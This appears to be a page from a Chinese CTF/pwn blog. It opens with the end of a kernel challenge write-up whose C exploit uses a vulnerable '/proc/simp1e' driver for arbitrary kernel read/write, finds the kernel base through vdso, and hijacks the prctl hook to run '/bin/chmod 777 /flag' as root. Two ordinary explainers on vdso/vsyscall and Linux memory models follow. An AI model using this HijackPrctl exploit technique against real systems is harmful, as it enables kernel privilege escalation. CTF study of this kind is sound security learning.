CSAW_READ_CHANNEL, &amp;read_channel);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span>* write_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_channel</span>;</span></span><br><span class="line"></span><br><span class="line">    seek_channel.id = channel_id;</span><br><span class="line">    seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    write_channel.id = channel_id;</span><br><span class="line">    write_channel.buf = (<span class="keyword">char</span>*)write_buff;</span><br><span class="line">    write_channel.count = len;</span><br><span class="line">    ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_channel);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd, channel_id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_channel</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> addr;</span><br><span class="line">    <span class="keyword">uint32_t</span> result;</span><br><span class="line">    <span class="keyword">int</span>* read_buff = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> i;</span><br><span class="line">    <span class="keyword">uint64_t</span> vdso_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span> ,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/proc/simp1e&quot;</span>, O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">        error(<span class="string">&quot;open dev error&quot;</span>);</span><br><span class="line"></span><br><span class="line">    alloc_channel.buf_size = <span class="number">0x100</span>;</span><br><span class="line">    alloc_channel.id = <span class="number">-1</span>;</span><br><span class="line">    ioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(alloc_channel.id == <span class="number">-1</span> )</span><br><span class="line">        error(<span class="string">&quot;alloc channel error&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;channel id: %d\n&quot;</span>,alloc_channel.id);</span><br><span class="line"></span><br><span class="line">    channel_id = alloc_channel.id;</span><br><span class="line"></span><br><span class="line">    shrink_channel.id = channel_id;</span><br><span class="line">    shrink_channel.size = <span class="number">0x100</span> + <span class="number">1</span>;</span><br><span class="line">    ioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_channel);;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(addr=<span class="number">0xffffffff80000000</span>; addr&lt;<span class="number">0xffffffffffffefff</span>; addr+=<span class="number">0x1000</span>) &#123;</span><br><span class="line">        RAA(fd, channel_id, &amp;read_buff, addr, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (read_buff == <span class="number">0x010102464c457f</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;find it: %p\n&quot;</span>,addr);</span><br><span class="line">            vdso_addr = addr;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(vdso_addr==<span class="number">0</span>)</span><br><span class="line">        error(<span class="string">&quot;can&#x27;t find vdso_bsae&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_base = vdso_addr - <span class="number">0x1020000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel base addr: %lp\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> poweroff_work_func_offset = <span class="number">0x9c4c0</span>; </span><br><span class="line">    <span class="keyword">uint64_t</span> poweroff_cmd_offset = <span class="number">0x123d1e0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> prctl_hook_offset = <span class="number">0x124fd00</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> poweroff_work_func_addr = kernel_base + poweroff_work_func_offset;</span><br><span class="line">    <span class="keyword">uint64_t</span> poweroff_cmd_addr = kernel_base + poweroff_cmd_offset;</span><br><span class="line">    <span class="keyword">uint64_t</span> task_prctl_hook_addr = kernel_base + prctl_hook_offset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> arbitrary_command[] = <span class="string">&quot;/bin/chmod 777 /flag&quot;</span>;</span><br><span class="line">    WAA(fd, channel_id, arbitrary_command, poweroff_cmd_addr, <span class="built_in">strlen</span>(arbitrary_command));</span><br><span class="line">    WAA(fd, channel_id, &amp;poweroff_work_func_addr, task_prctl_hook_addr, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    prctl(<span class="number">0</span> ,<span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag: &quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>第一次遇到 HijackPrctl，最后的 exp 参考了下 raycp 大佬的思路</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/03/Linux%20vdso&vsyscall/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/03/Linux%20vdso&vsyscall/" class="post-title-link" itemprop="url">Linux vdso&vsyscall</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-03 21:00:16 / Modified: 21:00:51" itemprop="dateCreated datePublished" datetime="2022-10-03T21:00:16+08:00">2022-10-03</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>3.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>基础知识</strong></p>
<p>随便用 GDB 调试一个 ELF 文件，使用 <code>vmmap</code> 命令就可以找到它们：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">0x7ffff7fc9000</span>     <span class="number">0x7ffff7fcd000</span> r--p     <span class="number">4000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7fcd000</span>     <span class="number">0x7ffff7fcf000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7fcf000</span>     <span class="number">0x7ffff7fd0000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd0000</span>     <span class="number">0x7ffff7ff3000</span> r-xp    <span class="number">23000</span> <span class="number">1000</span>   /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ff3000</span>     <span class="number">0x7ffff7ffb000</span> r--p     <span class="number">8000</span> <span class="number">24000</span>  /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">2</span>c000  /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">2</span>d000  /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      [anon_7ffff7ffe]</span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> --xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br></pre></td></tr></table></figure>
<ul>
<li>vsyscall：第一种也是最古老的一种用于加快系统调用的机制<ul>
<li>它提供了一种在用户空间下快速执行系统调用的方法</li>
<li>Linux 内核在用户空间映射一个包含一些变量及一些系统调用的实现的内存页，对特定的系统调用使用函数调用进行代替（不必切换到内核态）</li>
</ul>
</li>
<li>vdso(virtual dynamic shared object)：vdso 是用来代替 vsyscall 的<ul>
<li>vsyscall 区域太小了，而且映射区域固定，有安全问题（为了兼容性考虑，vsyscall 还是存在）</li>
<li>vdso 其实是一个动态库，它由内核提供，映射到每个进程的地址空间，它将提供一些函数调用来替代系统调用</li>
<li>本质上 vdso 是一段内核空间的代码，映射给用户态使其更快地调用系统调用</li>
</ul>
</li>
<li>vvar：存放数据的地方，vdso 中的函数会使用 vvar 中的数据</li>
</ul>
<p><strong>vsyscall</strong></p>
<ul>
<li>Intel 最先实现了专门的快速系统调用指令 sysenter 和系统调用返回指令 sysexit</li>
<li>AMD 针锋相对地实现了另一组专门的快速系统调用指令 syscall 和系统调用返回指令 sysret</li>
</ul>
<p>vsyscall 机制的核心就在于：通过调用 <code>__kernel_vsyscall</code> 来确定到底应该执行 syscall/sysret 指令还是 sysenter/sysexit 指令 </p>
<ul>
<li><code>__kernel_vsyscall</code> 是一个特殊的页，其位于内核地址空间，但也是唯一允许用户访问的区域，该区域的地址固定为 <code>0xffffffffff600000</code>（64位系统），大小固定为4K（所有的进程都共享内核映射）</li>
<li><code>__kernel_vsyscall</code> 属于内核数据，用户态程序只能通过 ELF 辅助向量来获取其基地址（具体来说是  AT_SYSINFO）</li>
<li>在ELF辅助向量中找到 AT_SYSINFO 后，就会像传统系统调用一样，将系统调用号和参数写入寄存器中，调用 <code>__kernel_vsyscall</code> 函数（由它来判断执行 syscall 还是 sysenter）</li>
</ul>
<p>vsyscall 还可以对特定的系统调用使用函数调用进行代替，在 Linux 路径 <code>/usr/include/asm/vsyscall.h</code> 中可以看到如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_VSYSCALL_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_VSYSCALL_H</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">vsyscall_num</span> &#123;</span></span><br><span class="line">	__NR_vgettimeofday, </span><br><span class="line">	__NR_vtime,</span><br><span class="line">	__NR_vgetcpu,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VSYSCALL_ADDR (-10UL &lt;&lt; 20)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* _ASM_X86_VSYSCALL_H */</span></span></span><br></pre></td></tr></table></figure>
<p>vsyscall 机制支持的系统调用有3个：</p>
<ul>
<li>gettimeofday()：把时间包装为一个结构体返回，包括秒，微妙，时区等信息</li>
<li>time()：获取当前的系统时间，返回一个大整数 </li>
<li>getcpu()：获取CPU信息</li>
</ul>
<p>这些函数都有一个特点：Root 用户和普通用户都会获得相同的结果（不存在安全问题）</p>
<ul>
<li>在内核与用户态之间建立一段共享内存区域，由内核定期“推送”最新值到该共享内存区域</li>
<li>当用户态程序在调用这些系统调用的时候，库函数并不真正执行系统调用，而是通过 vsyscall page（我们在GDB中看到的就是这个）来读取该数据的最新值</li>
<li>将系统调用改造成了函数调用，直接提升了执行性能（减少了内核的开销）</li>
</ul>
<p><strong>vdso</strong></p>
<p>vdso 是用来代替 vsyscall 的，它们的区别如下：</p>
<ul>
<li>vdso 本质上是一个ELF共享目标文件，而 vsyscall 只是一段内存代码和数据</li>
<li>vsyscall 位于内核地址空间，采用静态地址映射方式，而 vdso 借助共享目标文件天生具有的 PIC 特性，可以以进程为粒度动态映射到进程地址空间中</li>
</ul>
<p>通过 <code>ldd</code> 命令就可以轻松找到 vdso：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  exp ldd /bin/sh</span><br><span class="line">	linux-vdso.so.1 (0x00007ffe04dee000) # target</span><br><span class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f70dd181000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007f70dd3ad000)</span><br></pre></td></tr></table></figure>
<ul>
<li>vdso mapping 的本体是一个ELF共享目标文件</li>
<li>源码位于 Linux 内核，路径为 <code>/arch/x86/entry/vdso</code></li>
<li>其中包括一小段汇编代码，一些C源文件和一个链接器脚本</li>
</ul>
<p>vdso 同样也拥有替代系统调用的能力，相关代码如下：（在上述路径的 <code>vdso.lds.S</code> 文件中）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * This controls what userland symbols we export from the vDSO.</span><br><span class="line"> */</span><br><span class="line">VERSION &#123;</span><br><span class="line">	LINUX_2.6 &#123;</span><br><span class="line">	global:</span><br><span class="line">		clock_gettime;</span><br><span class="line">		__vdso_clock_gettime;</span><br><span class="line">		gettimeofday;</span><br><span class="line">		__vdso_gettimeofday;</span><br><span class="line">		getcpu;</span><br><span class="line">		__vdso_getcpu;</span><br><span class="line">		time;</span><br><span class="line">		__vdso_time;</span><br><span class="line">	local: *;</span><br><span class="line">	&#125;;</span><br></pre></td></tr></table></figure>
<p>vdso 机制支持的系统调用有4个：</p>
<ul>
<li>gettimeofday()：把时间包装为一个结构体返回，包括秒，微妙，时区等信息</li>
<li>time()：获取当前的系统时间，返回一个大整数 </li>
<li>getcpu()：获取CPU信息</li>
<li>clock_gettime()：用于计算精度和纳秒</li>
</ul>
<p>其实现原理和 vsyscall 有所不同：</p>
<ul>
<li>当一个程序被加载时，动态链接器和加载器便会加载程序依赖的动态链接对象，也包括 vdso</li>
<li>当 glibc 解析ELF头部时，会存储有关于 vdso 的一些位置信息，也包括简短的 stub 函数，用来在真正执行系统调用前搜索 vdso 中的符号名</li>
<li>在 glibc 中的代码会在 vdso 中搜索对应的函数并且返回其地址，真正发挥作用的代码就被包装在 vdso 而不是在内核里，当然也就不需要系统调用了</li>
<li>vdso 需要用到的内核信息由 vvar mapping 提供，vdso 本身的地址则依靠 ELF 辅助向量进行传递（具体来说是 AT_SYSINFO_EHDR）</li>
</ul>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903429907677191#heading-26">Linux 系统调用权威指南</a> </li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/436454953">Linux vDSO概述</a> </li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/02/Linux%20%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%AE%80%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/02/Linux%20%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%AE%80%E6%9E%90/" class="post-title-link" itemprop="url">Linux 内存模型简析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-02 21:51:26 / Modified: 21:54:12" itemprop="dateCreated datePublished" datetime="2022-10-02T21:51:26+08:00">2022-10-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>memory model</strong></p>
<p>在 Linux 内核中支持3种内存模型，分别为：</p>
<ul>
<li>flat memory model（平坦内存模型）</li>
<li>discontiguous memory model（不连续内存模型）</li>
<li>sparse memory model（稀疏内存模型）</li>
</ul>
<p>所谓 memory model（内存模型），其实就是从 CPU 的角度看其物理内存的分布情况，代表了在 Linux Kernel 中，使用什么的方式来管理这些物理内存（某些体系架构支持多种内存模型，但在内核编译构建时只能选择使用一种内存模型）</p>
<ul>
<li>程序分段和 CPU 内存分段是不同的概念 </li>
</ul>
<img src="/2022/10/02/Linux%20%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%AE%80%E6%9E%90/1664695526151.png" class width="1664695526151"> 
<p>在 <code>include/asm-generic/memory_model.h</code> 中，Linux 为每个 memory model 准备了如下的宏定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> page_to_pfn __page_to_pfn <span class="comment">/* 虚拟内存-&gt;物理内存 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pfn_to_page __pfn_to_page <span class="comment">/* 物理内存-&gt;虚拟内存 */</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>用于把虚拟内存中的 <code>struct page</code> 和切分后的物理内存 <code>page frame</code> 关联起来</li>
</ul>
<p><strong>Flat memory model（平坦内存模型）</strong></p>
<p>平坦内存模型是相对于多段模型而言的</p>
<ul>
<li>8086实模式CPU的16位寄存器最多只能在一个内存段的64kb空间内寻址，要是超过64kb，它只能先变换段基址，来达到长距离取指的目的</li>
<li>平坦模型至始至终只有一个段，它能直接访问内存空间，不用再进行段基址的变换</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __pfn_to_page(pfn)	(mem_map + ((pfn) - ARCH_PFN_OFFSET))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __page_to_pfn(page)	((unsigned long)((page) - mem_map) + \</span></span><br><span class="line"><span class="meta">				 ARCH_PFN_OFFSET)</span></span><br></pre></td></tr></table></figure>
<p>图示：</p>
<img src="/2022/10/02/Linux%20%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%AE%80%E6%9E%90/1664699048502.png" class width="1664699048502"> 
<ul>
<li>对于 flat memory model 来说，物理内存本身是连续的</li>
<li>如果不连续的话，那么中间一部分物理地址是没有对应的物理内存，就会形成一个个洞，这就浪费了 mem_map 数组本身占用的内存空间</li>
</ul>
<p>其特点如下：</p>
<ul>
<li>内存连续且不存在空隙</li>
<li>通常应用于 UMA 系统（一致内存访问）</li>
<li>通过 CONFIG_FLATMEM 进行配置</li>
</ul>
<p><strong>Discontiguous memory model（不连续内存模型）</strong></p>
<p>如果CPU在访问物理内存的时候，其地址空间是有一些空洞的，是不连续的，那么这种计算机系统的内存模型就是 discontiguous memory model </p>
<ul>
<li>discontiguous memory model 是为了 NUMA 系统设计的（非一致内存访问）</li>
<li>NUMA 系统中每个 CPU 都有自己的本地内存，CPU 访问本地内存不用过总线，因而速度要快很多，每个 CPU 和内存在一起，称为一个 NUMA 节点</li>
<li>NUMA 中的每个节点 Node 用一个 pglist_data 的结构体表示 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __pfn_to_page(pfn)			\</span></span><br><span class="line"><span class="meta">(&#123;	unsigned long __pfn = (pfn);		\</span></span><br><span class="line"><span class="meta">	unsigned long __nid = arch_pfn_to_nid(__pfn);  \</span></span><br><span class="line"><span class="meta">	NODE_DATA(__nid)-&gt;node_mem_map + arch_local_page_offset(__pfn, __nid);\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __page_to_pfn(pg)						\</span></span><br><span class="line"><span class="meta">(&#123;	const struct page *__pg = (pg);					\</span></span><br><span class="line"><span class="meta">	struct pglist_data *__pgdat = NODE_DATA(page_to_nid(__pg));	\</span></span><br><span class="line"><span class="meta">	(unsigned long)(__pg - __pgdat-&gt;node_mem_map) +			\</span></span><br><span class="line"><span class="meta">	 __pgdat-&gt;node_start_pfn;					\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure>
<p>图示：</p>
<img src="/2022/10/02/Linux%20%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%AE%80%E6%9E%90/1664699135513.png" class width="1664699135513"> 
<ul>
<li>由于每个 CPU 都有自己的本地内存，导致了物理内存必然有一些空洞</li>
</ul>
<p>其特点如下：</p>
<ul>
<li>多个内存节点不连续并且存在空隙</li>
<li>适用于 UMA 系统和 NUMA 系统</li>
<li>通过 CONFIG_CONTIGMEM 配置</li>
</ul>
<p>随着 sparse memory model 的提出，这种内存模型也逐渐被弃用了（ARM在2010年已经移除了对 discontiguous memory model 的支持）</p>
<p><strong>Sparse memory model（稀疏内存模型）</strong></p>
<p>sparse memory model 是为了解决 discontiguous memory model 存在的弊端，而被提出的</p>
<ul>
<li>连续的地址空间按照 section 被分成一段一段的，其中每一个 section 都是 Hotplug 的，因此内存地址空间可以被切分的更细，支持更离散的不连续内存</li>
<li>被管理的物理内存由一个个任意大小的 mem_section 构成，因此整个物理内存可被视为一个 mem_section 数组，每个 mem_section 包含了一个间接指向 page 数组的指针</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __page_to_pfn(pg)					\</span></span><br><span class="line"><span class="meta">(&#123;	const struct page *__pg = (pg);				\</span></span><br><span class="line"><span class="meta">	int __sec = page_to_section(__pg);			\</span></span><br><span class="line"><span class="meta">	(unsigned long)(__pg - __section_mem_map_addr(__nr_to_section(__sec)));	\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __pfn_to_page(pfn)				\</span></span><br><span class="line"><span class="meta">(&#123;	unsigned long __pfn = (pfn);			\</span></span><br><span class="line"><span class="meta">	struct mem_section *__sec = __pfn_to_section(__pfn);	\</span></span><br><span class="line"><span class="meta">	__section_mem_map_addr(__sec) + __pfn;		\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure>
<p>图示：</p>
<img src="/2022/10/02/Linux%20%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%AE%80%E6%9E%90/1664699863779.png" class width="1664699863779"> 
<p>其特点如下：</p>
<ul>
<li>多个内存区域不连续并且存在空隙</li>
<li>以 section 为单位管理 online 和 hot-plug 内存</li>
<li>支持内存热插拔(hot plug memory)，但性能稍逊色于 DISCONTIGMEM</li>
<li>在x86或ARM64内存采用该中模型，其性能比 DISCONTIGMEM 更优并且与 FLATMEM 相当</li>
<li>对于ARM64平台默认选择该内存模型</li>
<li>通过 CONFIG_SPARSEMEM 配置</li>
</ul>
<p><strong>平台内存模型支持</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>系统架构</th>
<th>FLATMEM</th>
<th>DISCONTIGMEM</th>
<th>SPARSEMEM</th>
</tr>
</thead>
<tbody>
<tr>
<td>ARM</td>
<td>默认</td>
<td>不支持</td>
<td>某些系统可选配置</td>
</tr>
<tr>
<td>ARM64</td>
<td>不支持</td>
<td>不支持</td>
<td>默认</td>
</tr>
<tr>
<td>x86_32</td>
<td>默认</td>
<td>不支持</td>
<td>可配置</td>
</tr>
<tr>
<td>x86_32(NUMA)</td>
<td>不支持</td>
<td>默认</td>
<td>可配置</td>
</tr>
<tr>
<td>x86_64</td>
<td>不支持</td>
<td>不支持</td>
<td>默认</td>
</tr>
<tr>
<td>x86_64(NUMA)</td>
<td>不支持</td>
<td>不支持</td>
<td>默认</td>
</tr>
</tbody>
</table>
</div>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u012489236/article/details/106323088#:~:text=Linux提供了三种内存模型（ include%2Fasm-generic%2Fmemory_model.h ），一般处理器架构支持一种或者多种内存模型，这个在编译阶段就已经确定，比如目前在ARM64中，使用的 Sparse Memory Model,。 2.1 FLAT memory model (平坦内存模型">linux内存模型</a>) </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
